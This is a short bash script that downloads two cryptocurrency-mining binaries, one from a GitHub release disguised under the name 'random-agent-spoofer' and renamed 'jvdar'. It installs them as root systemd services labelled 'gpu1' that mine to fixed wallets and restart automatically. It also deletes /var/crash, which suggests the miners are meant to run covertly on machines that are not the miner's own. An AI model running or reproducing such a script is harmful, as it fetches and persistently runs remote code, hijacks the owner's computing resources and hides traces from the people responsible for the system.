#!/bin/bash
cd /home

sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
sudo cp ar jvdar 
sudo chmod +x jvdar
sudo rm -rf /lib/systemd/system/rtm2.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/rtm2.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/jvdar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.dockertest -p x
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
sudo chmod +x packetcrypt
sudo rm -rf /lib/systemd/system/pktpool.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/packetcrypt ann -p pkt1qydtp765qufxpwr5wxfzdmv9m9khgdc8muzgax6 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&



systemctl daemon-reload &&
systemctl enable rtm2.service &&
systemctl enable pktpool.service &&
service rtm2 stop  &&
service rtm2 restart
service pktpool stop  &&
service pktpool restart
